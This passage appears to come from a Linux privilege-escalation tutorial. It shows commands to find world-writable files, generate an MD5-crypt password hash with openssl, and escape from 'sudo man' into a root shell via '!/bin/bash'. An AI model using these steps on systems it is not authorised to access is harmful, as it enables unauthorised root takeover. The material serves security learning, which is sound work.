### **Practical Demonstration**

{% code overflow="wrap" lineNumbers="true" %}
```bash
# So, putting it all together, the command find / -not -type l -perm -o+w searches the entire file system starting at the root directory (/) and looks for files that are writable by anyone and are not symbolic links.

find / -not -type l -perm -o+w # Search for file on the target system that the every user can read/write.

openssl passwd -1 -salt <randomText> <newPassword> #Generate a hashed password with algorithm 1.
```
{% endcode %}

### **Practical Demonstration**

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo -l # List the files/commands the current user can use as sudo.

# in this case the user can execute the (/usr/bin/man) binary, The "man" binary on linux essential provides us with the mannual/help for linux cmds/utilities.
sudo man ls # launch the manual page for "ls" utility.
# click "!" then type /bin/bash, provides us with a root session.
!/bin/bash
```
{% endcode %}
